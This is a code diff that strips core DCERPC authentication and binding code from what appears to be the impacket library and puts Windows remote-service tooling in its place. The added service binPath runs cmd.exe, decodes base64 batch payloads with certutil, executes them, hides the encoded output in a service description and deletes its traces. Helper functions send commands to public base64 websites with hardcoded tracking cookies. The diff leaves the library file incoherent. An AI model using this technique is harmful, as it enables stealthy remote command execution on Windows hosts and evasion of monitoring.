+def wrapper_hRStartServiceW(svcctl, hService):
+        try:
+                hRStartServiceW(svcctl, hService)
+        except Exception as e:
+                # 如果是服务响应超时，则不认为是错误
+                if e.error_code == 1053:
+                        return True
+                print("[-] error occured")
+                print('xxxxxxxxxxxxxxxxxxxxxxxEXCEPTIONxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+                print(e)
+                print('xxxxxxxxxxxxxxxxxxxxxxxEXCEPTIONxxxxxxxxxxxxxxxxxxxxxxxxxxx')
+                return False
+"""
+BOOL QueryServiceConfig2W(
+  [in]            SC_HANDLE hService,
+  [in]            DWORD     dwInfoLevel,
+  [out, optional] LPBYTE    lpBuffer,
+  [in]            DWORD     cbBufSize,
+  [out]           LPDWORD   pcbBytesNeeded
+);
+BOOL QueryServiceConfigW(
+  [in]            SC_HANDLE               hService,
+  [out, optional] LPQUERY_SERVICE_CONFIGW lpServiceConfig,
+  [in]            DWORD                   cbBufSize,
+  [out]           LPDWORD                 pcbBytesNeeded
+);
+"""
+def hRQueryServiceConfig2W(dce, hService):
+        queryService = RQueryServiceConfig2W()
+        queryService['hService'] = hService
+        queryService['cbBufSize'] = 1024
+        queryService['dwInfoLevel']=1
+        try:
+                resp = dce.request(queryService)
+        except DCERPCSessionError as e:
+                if e.get_error_code() == system_errors.ERROR_INSUFFICIENT_BUFFER:
+                        resp = e.get_packet()
+                        print(f"buffersize: {resp['pcbBytesNeeded']}")
+                        queryService['cbBufSize'] = resp['pcbBytesNeeded']
+                        resp = dce.request(queryService)
                 else:
-                    exception = sessionErrorClass(packet = response, error_code = error_code)
-            raise exception
-        else:
-            response =  respClass(answer, isNDR64 = isNDR64)
-            return response
+                        raise
 
-class DCERPC_v4(DCERPC):
-    pass
+        return resp
 
-class DCERPC_v5(DCERPC):
-    def __init__(self, transport):
-        DCERPC.__init__(self, transport)
-        self.__auth_level = RPC_C_AUTHN_LEVEL_NONE
-        self.__auth_type = RPC_C_AUTHN_WINNT
-        self.__auth_type_callback = None
-        # Flags of the authenticated session. We will need them throughout the connection
-        self.__auth_flags = 0
-        self.__username = None
-        self.__password = None
-        self.__domain = ''
-        self.__lmhash = ''
-        self.__nthash = ''
-        self.__aesKey = ''
-        self.__TGT    = None
-        self.__TGS    = None
-        
-        self.__clientSigningKey = b''
-        self.__serverSigningKey = b''
-        self.__clientSealingKey = b''
-        self.__clientSealingHandle = b''
-        self.__serverSealingKey = b''
-        self.__serverSealingHandle = b''
-        self.__sequence = 0   
+remove_new_line_bat_template = """@echo off
+setlocal EnableDelayedExpansion
+set row=
+for /f %%x in (4.txt) do set "row=!row!%%x"
+sc description qwer "%row%\""""
 
-        self.transfer_syntax = uuidtup_to_bin(('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0'))
-        self.__callid = 1
-        self._ctx = 0
-        self.__sessionKey = None
-        self.__max_xmit_size  = 0
-        self.__flags = 0
-        self.__cipher = None
-        self.__confounder = b''
-        self.__gss = None
+service_bin_path_template = 'C:\windows\system32\cmd.exe /c echo QGVjaG8gb2ZmCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24Kc2V0IHJvdz0KZm9yIC9mICUleCBpbiAoNC50eHQpIGRvIHNldCAicm93PSFyb3chJSV4IgplY2hvICVyb3clID5uZXdmaWxlLnR4dAplY2hvICVyb3cl>2.txt&&certutil -f -decode 2.txt 2.bat&&echo ZWNobyAyMyA+QzpcdXNlcnNccHVibGljXGRvd25sb2Fkc1wxMjM0NS50eHQ=>0.txt&&certutil -f -decode 0.txt 1.bat&&type 1.bat>2.txt&&copy /y 2.txt 1.bat&&1.bat>3.txt 2>&1&&certutil -f -encode 3.txt 4.txt&&2.bat&&del 1.txt;2.txt;1.bat;2.bat;4.txt;newfile.txt;3.txt;0.txt'
 
-    def set_session_key(self, session_key):
-        self.__sessionKey = session_key
+def generate_random_string(length):
+        letters = string.ascii_lowercase
+        result_str = ''.join(random.choice(letters) for i in range(length))
+        return result_str
+def b64DecodeAPI(srcStr,my_codec):
+        aaamy_codec=my_codec
+        if my_codec=='GBK':
+                aaamy_codec='GB18030'
+        # print(f"{bcolors.OKBLUE}[*] encode text: \n{srcStr}{bcolors.ENDC}")
+        cookies = {
+                '_ga': 'GA1.2.382353072.1668334362',
+                '_gid': 'GA1.2.1481584565.1668334362',
+                '__gads': 'ID=7e87b6a44e7646bc:T=1668334366:S=ALNI_MaRQ2o2-uzGdTnm_MKghGVadUrLqw',
+                '__gpi': 'UID=00000b7b1b1db821:T=1668334366:RT=1668411275:S=ALNI_MZ2guNzJXE_M3tWVK-9v88S3PLDhg',
+                'cto_bundle': 'cjdx2V9TU3RWQ3dES1F4NFJiRndjWDh5UFJjT1Y2OHRXaGtmanUwa3c4NEM5TE1vV0RRZ3hveDBMJTJCMUZOVDAwZlVjbmtDdiUyQndPeER3UnQ0VmtUbkExWVhFQ25veTZvMWo2dEFIaiUyQjc5MTRONXFka0NhMUlLWSUyQkt6a0pSQUZnTzhLZ0xBZ3R5N1NKSSUyRlRnNG50aTBGa00wcmx2bkVUMm0wMiUyRmQ0UHhsMlFnS3FrSHMlM0Q',
+                'OPTIONS': '{%22option_text_charset%22:%22UTF-8%22%2C%22option_text_newlines%22:%22off%22%2C%22option_file_newlines%22:%22off%22%2C%22option_text_live%22:%22off%22%2C%22textarea_height_input%22:220%2C%22textarea_height_output%22:220}',
+        }
 
-    def get_session_key(self):
-        return self.__sessionKey
+        headers = {
+                'authority': 'www.base64decode.org',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                'cache-control': 'max-age=0',
+                # Requests sorts cookies= alphabetically
+                # 'cookie': '_ga=GA1.2.382353072.1668334362; _gid=GA1.2.1481584565.1668334362; __gads=ID=7e87b6a44e7646bc:T=1668334366:S=ALNI_MaRQ2o2-uzGdTnm_MKghGVadUrLqw; __gpi=UID=00000b7b1b1db821:T=1668334366:RT=1668411275:S=ALNI_MZ2guNzJXE_M3tWVK-9v88S3PLDhg; cto_bundle=cjdx2V9TU3RWQ3dES1F4NFJiRndjWDh5UFJjT1Y2OHRXaGtmanUwa3c4NEM5TE1vV0RRZ3hveDBMJTJCMUZOVDAwZlVjbmtDdiUyQndPeER3UnQ0VmtUbkExWVhFQ25veTZvMWo2dEFIaiUyQjc5MTRONXFka0NhMUlLWSUyQkt6a0pSQUZnTzhLZ0xBZ3R5N1NKSSUyRlRnNG50aTBGa00wcmx2bkVUMm0wMiUyRmQ0UHhsMlFnS3FrSHMlM0Q; OPTIONS={%22option_text_charset%22:%22UTF-8%22%2C%22option_text_newlines%22:%22off%22%2C%22option_file_newlines%22:%22off%22%2C%22option_text_live%22:%22off%22%2C%22textarea_height_input%22:220%2C%22textarea_height_output%22:220}',
+                'origin': 'https://www.base64decode.org',
+                'referer': 'https://www.base64decode.org/',
+                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+        }
 
-    def set_auth_level(self, auth_level):
-        self.__auth_level = auth_level
+        data = {
+                'input': srcStr,
+                'charset': aaamy_codec,
+        }
+        proxies={
+                'http':'127.0.0.1:7890',
+                'https':'127.0.0.1:7890',
+        }
+        # response = requests.post('https://www.base64decode.org/', cookies=cookies, headers=headers, data=data)
+        response = requests.post('https://www.base64decode.org/', cookies=cookies, headers=headers, data=data)#,proxies=proxies)
 
-    def set_auth_type(self, auth_type, callback = None):
-        self.__auth_type = auth_type
-        self.__auth_type_callback = callback
+        print(convertTuple(re.findall(r"<textarea name=\"output\".*?\"height:220px;\">((.|\n)*?)</textarea>", response.text)[0]).replace("&gt;",">").replace("&quot;", '"').replace("&#039;", '"'))
 
-    def get_auth_type(self):
-        return self.__auth_type
+def encodeAPI(cmdOrder,my_codec):
 
-    def set_max_tfrag(self, size):
-        self.__max_xmit_size = size
-    
-    def get_credentials(self):
-        return self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, self.__TGT, self.__TGS
+        cookies = {
+                '_uc_referrer': 'https://www.google.com/',
+                '_pbjs_userid_consent_data': '3524755945110770',
+                '__qca': 'P0-343750202-1668246808037',
+                '_tfpvi': 'YThkY2NhZTUtOTkyMS00NTQyLWFiYTAtNGMxYjgxN2M0MTY0Iy02LTQ%3D',
+                '_lr_env_src_ats': 'false',
+                '_cc_id': 'b00c47f836abdf146bdc7beb6bea3bab',
+                '_au_1d': 'AU1D-0100-001668246816-O5S5WUIL-T6AU',
+                '_au_last_seen_iab_tcf': '1668246817108',
+                '_fbp': 'fb.1.1668246820488.322481334',
+                '_ga': 'GA1.2.37428437.1668334356',
+                'OPTIONS': '{%22option_text_charset%22:%22UTF-8%22%2C%22option_text_separator%22:%22lf%22%2C%22option_file_charset%22:%22BINARY%22%2C%22option_file_separator%22:%22lf%22%2C%22option_text_newlines%22:%22off%22%2C%22option_text_chunks%22:%22off%22%2C%22option_text_urlsafe%22:%22off%22%2C%22option_file_newlines%22:%22off%22%2C%22option_file_chunks%22:%22off%22%2C%22option_file_urlsafe%22:%22off%22%2C%22option_text_live%22:%22off%22%2C%22textarea_height_input%22:220%2C%22textarea_height_output%22:220}',
+                '__gads': 'ID=80dd962c4e12ca05:T=1668246815:S=ALNI_MaQh_UhYSGdAZ5fNo4tNi2WFPr2kA',
+                'cto_bidid': 'HokRnl90JTJGSHV1VXhGVHR1dE9wUlFhZ1hpcFRFY2h1VVlWaXFQOThGJTJGMUd2SHM2Sk92cGNZVVY2NHBPUW1HejI2UjZhWFRiTFE0N0dUUWFwMWppeiUyQnRibW91JTJCZ0JBZ09XQTBKVFNKYk5uaGd2eVo5ZlllTkd4Q3Q5dEpBSXFWZUl4MmZv',
+                '_gid': 'GA1.2.996041912.1668690088',
+                'pbjs_li_nonid': '%7B%7D',
+                '_au_last_seen_pixels': 'eyJhcG4iOjE2Njg2OTAwOTQsInR0ZCI6MTY2ODY5MDA5NCwicHViIjoxNjY4NjkwMDk0LCJhZHgiOjE2Njg2OTAwOTQsImdvbyI6MTY2ODY5MDA5NCwic21hcnQiOjE2Njg2OTAxMDIsInBwbnQiOjE2Njg2OTAwOTQsIm1lZGlhbWF0aCI6MTY2ODY5MDEwMiwic29uIjoxNjY4NjkwMDk0LCJhZG8iOjE2Njg2OTAwOTQsInRhYm9vbGEiOjE2Njg2OTAwOTQsImltcHIiOjE2Njg2OTAxMDIsImJlZXMiOjE2Njg2OTAwOTQsInJ1YiI6MTY2ODY5MDEwMiwib3BlbngiOjE2Njg2OTAxMDIsInVucnVseSI6MTY2ODY5MDEwMn0=',
+                'cto_bundle': 'PaVk-l9DUmhSb0o1RGJzcDI0dkhMSmJuJTJGU2d1bEl0Qk1qeUZ3YWlGQnZoN01UZ0pNQjF3dDhJM2FWU3kxN00xVkE5M3VOSUgxQVMyWGh4QkUlMkJUS0RvdGZtbnZQRHglMkJac095bFJWV3lNUXN5allwN3A0ODF6VmxwMmk4bkpoVzZMNjhYMiUyRmlzTXIwbXFCUiUyQkozOWk3bjBZUEtJbFZNeUNCdVFNTGphQW8zdzd1MVVzJTNE',
+                '__gpi': 'UID=00000b7a4392902a:T=1668246815:RT=1668750123:S=ALNI_MbUW8GgIU6R3J6t5ZeKA0NRp6n9hg',
+                '_lr_retry_request': 'true',
+                '_gat_gtag_UA_74823759_31': '1',
+                '_au_last_seen_apn': '1668752317494',
+                '_au_last_seen_ttd': '1668752317494',
+                '_au_last_seen_pub': '1668752317494',
+                '_au_last_seen_adx': '1668752317494',
+                '_au_last_seen_goo': '1668752317494',
+                '_au_last_seen_son': '1668752317494',
+                '_au_last_seen_smart': '1668752317494',
+                '_au_last_seen_ado': '1668752317494',
+                '_au_last_seen_openx': '1668752317494',
+                '_au_last_seen_mediamath': '1668752317494',
+        }
 
-    def set_credentials(self, username, password, domain = '', lmhash = '', nthash = '', aesKey = '', TGT = None, TGS = None):
-        self.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
-        self.__username = username
-        self.__password = password
-        self.__domain   = domain
-        self.__aesKey   = aesKey
-        self.__TGT      = TGT
-        self.__TGS      = TGS
-        if lmhash != '' or nthash != '':
-            if len(lmhash) % 2:
-                lmhash = '0%s' % lmhash
-            if len(nthash) % 2:
-                nthash = '0%s' % nthash
-            try: # just in case they were converted already
-                self.__lmhash = unhexlify(lmhash)
-                self.__nthash = unhexlify(nthash)
-            except:
-                self.__lmhash = lmhash
-                self.__nthash = nthash
-                pass
+        headers = {
+                'authority': 'www.base64encode.org',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
+                'cache-control': 'max-age=0',
+                # Requests sorts cookies= alphabetically
+                # 'cookie': '_uc_referrer=https://www.google.com/; _pbjs_userid_consent_data=3524755945110770; __qca=P0-343750202-1668246808037; _tfpvi=YThkY2NhZTUtOTkyMS00NTQyLWFiYTAtNGMxYjgxN2M0MTY0Iy02LTQ%3D; _lr_env_src_ats=false; _cc_id=b00c47f836abdf146bdc7beb6bea3bab; _au_1d=AU1D-0100-001668246816-O5S5WUIL-T6AU; _au_last_seen_iab_tcf=1668246817108; _fbp=fb.1.1668246820488.322481334; _ga=GA1.2.37428437.1668334356; OPTIONS={%22option_text_charset%22:%22UTF-8%22%2C%22option_text_separator%22:%22lf%22%2C%22option_file_charset%22:%22BINARY%22%2C%22option_file_separator%22:%22lf%22%2C%22option_text_newlines%22:%22off%22%2C%22option_text_chunks%22:%22off%22%2C%22option_text_urlsafe%22:%22off%22%2C%22option_file_newlines%22:%22off%22%2C%22option_file_chunks%22:%22off%22%2C%22option_file_urlsafe%22:%22off%22%2C%22option_text_live%22:%22off%22%2C%22textarea_height_input%22:220%2C%22textarea_height_output%22:220}; __gads=ID=80dd962c4e12ca05:T=1668246815:S=ALNI_MaQh_UhYSGdAZ5fNo4tNi2WFPr2kA; cto_bidid=HokRnl90JTJGSHV1VXhGVHR1dE9wUlFhZ1hpcFRFY2h1VVlWaXFQOThGJTJGMUd2SHM2Sk92cGNZVVY2NHBPUW1HejI2UjZhWFRiTFE0N0dUUWFwMWppeiUyQnRibW91JTJCZ0JBZ09XQTBKVFNKYk5uaGd2eVo5ZlllTkd4Q3Q5dEpBSXFWZUl4MmZv; _gid=GA1.2.996041912.1668690088; pbjs_li_nonid=%7B%7D; _au_last_seen_pixels=eyJhcG4iOjE2Njg2OTAwOTQsInR0ZCI6MTY2ODY5MDA5NCwicHViIjoxNjY4NjkwMDk0LCJhZHgiOjE2Njg2OTAwOTQsImdvbyI6MTY2ODY5MDA5NCwic21hcnQiOjE2Njg2OTAxMDIsInBwbnQiOjE2Njg2OTAwOTQsIm1lZGlhbWF0aCI6MTY2ODY5MDEwMiwic29uIjoxNjY4NjkwMDk0LCJhZG8iOjE2Njg2OTAwOTQsInRhYm9vbGEiOjE2Njg2OTAwOTQsImltcHIiOjE2Njg2OTAxMDIsImJlZXMiOjE2Njg2OTAwOTQsInJ1YiI6MTY2ODY5MDEwMiwib3BlbngiOjE2Njg2OTAxMDIsInVucnVseSI6MTY2ODY5MDEwMn0=; cto_bundle=PaVk-l9DUmhSb0o1RGJzcDI0dkhMSmJuJTJGU2d1bEl0Qk1qeUZ3YWlGQnZoN01UZ0pNQjF3dDhJM2FWU3kxN00xVkE5M3VOSUgxQVMyWGh4QkUlMkJUS0RvdGZtbnZQRHglMkJac095bFJWV3lNUXN5allwN3A0ODF6VmxwMmk4bkpoVzZMNjhYMiUyRmlzTXIwbXFCUiUyQkozOWk3bjBZUEtJbFZNeUNCdVFNTGphQW8zdzd1MVVzJTNE; __gpi=UID=00000b7a4392902a:T=1668246815:RT=1668750123:S=ALNI_MbUW8GgIU6R3J6t5ZeKA0NRp6n9hg; _lr_retry_request=true; _gat_gtag_UA_74823759_31=1; _au_last_seen_apn=1668752317494; _au_last_seen_ttd=1668752317494; _au_last_seen_pub=1668752317494; _au_last_seen_adx=1668752317494; _au_last_seen_goo=1668752317494; _au_last_seen_son=1668752317494; _au_last_seen_smart=1668752317494; _au_last_seen_ado=1668752317494; _au_last_seen_openx=1668752317494; _au_last_seen_mediamath=1668752317494',
+                'origin': 'https://www.base64encode.org',
+                'referer': 'https://www.base64encode.org/',
+                'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+        }
 
-    def bind(self, iface_uuid, alter = 0, bogus_binds = 0, transfer_syntax = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')):
-        bind = MSRPCBind()
-        #item['TransferSyntax']['Version'] = 1
-        ctx = self._ctx
-        for i in range(bogus_binds):
-            item = CtxItem()
-            item['ContextID'] = ctx
-            item['TransItems'] = 1
-            item['ContextID'] = ctx
-            # We generate random UUIDs for bogus binds
-            item['AbstractSyntax'] = generate() + stringver_to_bin('2.0')
-            item['TransferSyntax'] = uuidtup_to_bin(transfer_syntax)
-            bind.addCtxItem(item)
-            self._ctx += 1
-            ctx += 1
+        data = {
+                'input': cmdOrder,
+                'charset': aaamy_codec,
+                'separator': 'lf',
+        }
 
-        # The true one :)
-        item = CtxItem()
-        item['AbstractSyntax'] = iface_uuid
-        item['TransferSyntax'] = uuidtup_to_bin(transfer_syntax)
-        item['ContextID'] = ctx
-        item['TransItems'] = 1
-        bind.addCtxItem(item)
+        #response = requests.post('https://www.base64encode.org/', cookies=cookies, headers=headers, data=data)
 
-        packet = MSRPCHeader()
-        packet['type'] = MSRPC_BIND
-        packet['pduData'] = bind.getData()
-        packet['call_id'] = self.__callid
-
-        if alter:
-            packet['type'] = MSRPC_ALTERCTX
-
-        if self.__auth_level != RPC_C_AUTHN_LEVEL_NONE:
-            if (self.__username is None) or (self.__password is None):
-                self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, self.__TGT, self.__TGS = self._transport.get_credentials()
-
-            if self.__auth_type == RPC_C_AUTHN_WINNT:
-                auth = ntlm.getNTLMSSPType1('', '', signingRequired=True,
-                                            use_ntlmv2=self._transport.doesSupportNTLMv2())
-            elif self.__auth_type == RPC_C_AUTHN_NETLOGON:
-                from impacket.dcerpc.v5 import nrpc
-                auth = nrpc.getSSPType1(self.__username[:-1], self.__domain, signingRequired=True)
-            elif self.__auth_type == RPC_C_AUTHN_GSS_NEGOTIATE:
-                self.__cipher, self.__sessionKey, auth = kerberosv5.getKerberosType1(self.__username, self.__password,
-                                                                                     self.__domain, self.__lmhash,
-                                                                                     self.__nthash, self.__aesKey,
-                                                                                     self.__TGT, self.__TGS,
-                                                                                     self._transport.getRemoteName(),
-                                                                                     self._transport.get_kdcHost())
-            else:
-                raise DCERPCException('Unsupported auth_type 0x%x' % self.__auth_type)
-
-            sec_trailer = SEC_TRAILER()
-            sec_trailer['auth_type']   = self.__auth_type
-            sec_trailer['auth_level']  = self.__auth_level
-            sec_trailer['auth_ctx_id'] = self._ctx + 79231 
-
-            pad = (4 - (len(packet.get_packet()) % 4)) % 4
-            if pad != 0:
-               packet['pduData'] += b'\xFF'*pad
-               sec_trailer['auth_pad_len']=pad
-
-            packet['sec_trailer'] = sec_trailer
-            packet['auth_data'] = auth
-
-        self._transport.send(packet.get_packet())
-
-        s = self._transport.recv()
-
-        if s != 0:
-            resp = MSRPCHeader(s)
-        else:
-            return 0 #mmm why not None?
-
-        if resp['type'] == MSRPC_BINDACK or resp['type'] == MSRPC_ALTERCTX_R:
-            bindResp = MSRPCBindAck(resp.getData())
-        elif resp['type'] == MSRPC_BINDNAK or resp['type'] == MSRPC_FAULT:
-            if resp['type'] == MSRPC_FAULT:
-                resp = MSRPCRespHeader(resp.getData())
-                status_code = unpack('<L', resp['pduData'][:4])[0]
-            else:
-                resp = MSRPCBindNak(resp['pduData'])
-                status_code = resp['RejectedReason']
-            if status_code in rpc_status_codes:
-                raise DCERPCException(error_code = status_code)
-            elif status_code in rpc_provider_reason:
-                raise DCERPCException("Bind context rejected: %s" % rpc_provider_reason[status_code])
-            else:
-                raise DCERPCException('Unknown DCE RPC fault status code: %.8x' % status_code)
-        else:
-            raise DCERPCException('Unknown DCE RPC packet type received: %d' % resp['type'])
-
-        # check ack results for each context, except for the bogus ones
-        for ctx in range(bogus_binds+1,bindResp['ctx_num']+1):
-            ctxItems = bindResp.getCtxItem(ctx)
-            if ctxItems['Result'] != 0:
-                msg = "Bind context %d rejected: " % ctx
-                msg += rpc_cont_def_result.get(ctxItems['Result'], 'Unknown DCE RPC context result code: %.4x' % ctxItems['Result'])
-                msg += "; "
-                reason = bindResp.getCtxItem(ctx)['Reason']
-                msg += rpc_provider_reason.get(reason, 'Unknown reason code: %.4x' % reason)
-                if (ctxItems['Result'], reason) == (2, 1): # provider_rejection, abstract syntax not supported
-                    msg += " (this usually means the interface isn't listening on the given endpoint)"
-                raise DCERPCException(msg)
-
-            # Save the transfer syntax for later use
-            self.transfer_syntax = ctxItems['TransferSyntax'] 
-
-        # The received transmit size becomes the client's receive size, and the received receive size becomes the client's transmit size.
-        self.__max_xmit_size = bindResp['max_rfrag']
-
-        if self.__auth_level != RPC_C_AUTHN_LEVEL_NONE:
-            if self.__auth_type == RPC_C_AUTHN_WINNT:
-                response, self.__sessionKey = ntlm.getNTLMSSPType3(auth, bindResp['auth_data'], self.__username,
-                                                                   self.__password, self.__domain, self.__lmhash,
-                                                                   self.__nthash,
-                                                                   use_ntlmv2=self._transport.doesSupportNTLMv2())
-                self.__flags = response['flags']
-            elif self.__auth_type == RPC_C_AUTHN_NETLOGON:
-                response = None
-            elif self.__auth_type == RPC_C_AUTHN_GSS_NEGOTIATE:
-                self.__cipher, self.__sessionKey, response = kerberosv5.getKerberosType3(self.__cipher,
-                                                                                         self.__sessionKey,
-                                                                                         bindResp['auth_data'])
-
-            self.__sequence = 0
-
-            if self.__auth_level in (RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY):
-                if self.__auth_type == RPC_C_AUTHN_WINNT:
-                    if self.__flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
-                        self.__clientSigningKey = ntlm.SIGNKEY(self.__flags, self.__sessionKey)
-                        self.__serverSigningKey = ntlm.SIGNKEY(self.__flags, self.__sessionKey,b"Server")
-                        self.__clientSealingKey = ntlm.SEALKEY(self.__flags, self.__sessionKey)
-                        self.__serverSealingKey = ntlm.SEALKEY(self.__flags, self.__sessionKey,b"Server")
-                        # Preparing the keys handle states
-                        cipher3 = ARC4.new(self.__clientSealingKey)
-                        self.__clientSealingHandle = cipher3.encrypt
-                        cipher4 = ARC4.new(self.__serverSealingKey)
-                        self.__serverSealingHandle = cipher4.encrypt
-                    else:
-                        # Same key for everything
-                        self.__clientSigningKey = self.__sessionKey
-                        self.__serverSigningKey = self.__sessionKey
-                        self.__clientSealingKey = self.__sessionKey
-                        self.__serverSealingKey = self.__sessionKey
-                        cipher = ARC4.new(self.__clientSigningKey)
-                        self.__clientSealingHandle = cipher.encrypt
-                        self.__serverSealingHandle = cipher.encrypt
-                elif self.__auth_type == RPC_C_AUTHN_NETLOGON:
-                    if self.__auth_level == RPC_C_AUTHN_LEVEL_PKT_INTEGRITY:
-                        self.__confounder = b''
-                    else:
-                        self.__confounder = b'12345678'
-
-            sec_trailer = SEC_TRAILER()
-            sec_trailer['auth_type'] = self.__auth_type
-            sec_trailer['auth_level'] = self.__auth_level
-            sec_trailer['auth_ctx_id'] = self._ctx + 79231 
-
-            if response is not None:
-                if self.__auth_type == RPC_C_AUTHN_GSS_NEGOTIATE:
-                    alter_ctx = MSRPCHeader()
-                    alter_ctx['type'] = MSRPC_ALTERCTX
-                    alter_ctx['pduData'] = bind.getData()
-                    alter_ctx['sec_trailer'] = sec_trailer
-                    alter_ctx['auth_data'] = response
-                    self._transport.send(alter_ctx.get_packet(), forceWriteAndx = 1)
-                    self.__gss = gssapi.GSSAPI(self.__cipher)
-                    self.__sequence = 0
-                    self.recv()
-                    self.__sequence = 0
-                else:
-                    auth3 = MSRPCHeader()
-                    auth3['type'] = MSRPC_AUTH3
-                    # pad (4 bytes): Can be set to any arbitrary value when set and MUST be 
-                    # ignored on receipt. The pad field MUST be immediately followed by a 
-                    # sec_trailer structure whose layout, location, and alignment are as 
-                    # specified in section 2.2.2.11
-                    auth3['pduData'] = b'    '
-                    auth3['sec_trailer'] = sec_trailer
-                    auth3['auth_data'] = response.getData()
-
-                    # Use the same call_id
-                    self.__callid = resp['call_id']
-                    auth3['call_id'] = self.__callid
-                    self._transport.send(auth3.get_packet(), forceWriteAndx = 1)
-
-            self.__callid += 1
-
-        return resp     # means packet is signed, if verifier is wrong it fails
-
-    def _transport_send(self, rpc_packet, forceWriteAndx = 0, forceRecv = 0):
-        rpc_packet['ctx_id'] = self._ctx
-        rpc_packet['sec_trailer'] = b''
-        rpc_packet['auth_data'] = b''
-
-        if self.__auth_level in [RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY]:
-            # Dummy verifier, just for the calculations
-            sec_trailer = SEC_TRAILER()
-            sec_trailer['auth_type'] = self.__auth_type
-            sec_trailer['auth_level'] = self.__auth_level
-            sec_trailer['auth_pad_len'] = 0
-            sec_trailer['auth_ctx_id'] = self._ctx + 79231 
-
-            pad = (4 - (len(rpc_packet.get_packet()) % 4)) % 4
-            if pad != 0:
-                rpc_packet['pduData'] += b'\xBB'*pad
-                sec_trailer['auth_pad_len']=pad
-
-            rpc_packet['sec_trailer'] = sec_trailer.getData()
-            rpc_packet['auth_data'] = b' '*16
-
-            plain_data = rpc_packet['pduData']
-            if self.__auth_level == RPC_C_AUTHN_LEVEL_PKT_PRIVACY:
-                if self.__auth_type == RPC_C_AUTHN_WINNT:
-                    if self.__flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
-                        # When NTLM2 is on, we sign the whole pdu, but encrypt just
-                        # the data, not the dcerpc header. Weird..
-                        sealedMessage, signature =  ntlm.SEAL(self.__flags, 
-                               self.__clientSigningKey, 
-                               self.__clientSealingKey,  
-                               rpc_packet.get_packet()[:-16], 
-                               plain_data, 
-                               self.__sequence, 
-                               self.__clientSealingHandle)
-                    else:
-                        sealedMessage, signature =  ntlm.SEAL(self.__flags, 
-                               self.__clientSigningKey, 
-                               self.__clientSealingKey,  
-                               plain_data, 
-                               plain_data, 
-                               self.__sequence, 
-                               self.__clientSealingHandle)
-                elif self.__auth_type == RPC_C_AUTHN_NETLOGON:
-                    from impacket.dcerpc.v5 import nrpc
-                    sealedMessage, signature = nrpc.SEAL(plain_data, self.__confounder, self.__sequence, self.__sessionKey, False)
-                elif self.__auth_type == RPC_C_AUTHN_GSS_NEGOTIATE:
-                    sealedMessage, signature = self.__gss.GSS_Wrap(self.__sessionKey, plain_data, self.__sequence)
-
-                rpc_packet['pduData'] = sealedMessage
-            elif self.__auth_level == RPC_C_AUTHN_LEVEL_PKT_INTEGRITY: 
-                if self.__auth_type == RPC_C_AUTHN_WINNT:
-                    if self.__flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
-                        # Interesting thing.. with NTLM2, what is is signed is the 
-                        # whole PDU, not just the data
-                        signature =  ntlm.SIGN(self.__flags,
-                               self.__clientSigningKey, 
-                               rpc_packet.get_packet()[:-16], 
-                               self.__sequence, 
-                               self.__clientSealingHandle)
-                    else:
-                        signature =  ntlm.SIGN(self.__flags, 
-                               self.__clientSigningKey, 
-                               plain_data, 
-                               self.__sequence, 
-                               self.__clientSealingHandle)
-                elif self.__auth_type == RPC_C_AUTHN_NETLOGON:
-                    from impacket.dcerpc.v5 import nrpc
-                    signature = nrpc.SIGN(plain_data, 
-                           self.__confounder, 
-                           self.__sequence, 
-                           self.__sessionKey, 
-                           False)
-                elif self.__auth_type == RPC_C_AUTHN_GSS_NEGOTIATE:
-                    signature = self.__gss.GSS_GetMIC(self.__sessionKey, plain_data, self.__sequence)
-
-            rpc_packet['sec_trailer'] = sec_trailer.getData()
-            rpc_packet['auth_data'] = signature
-
-            self.__sequence += 1
-
-        self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)
-
-    def send(self, data):
-        if isinstance(data, MSRPCHeader) is not True:
-            # Must be an Impacket, transform to structure
-            data = DCERPC_RawCall(data.OP_NUM, data.get_packet())
+        response = requests.post('https://www.base64encode.org/', cookies=cookies, headers=headers, data=data)
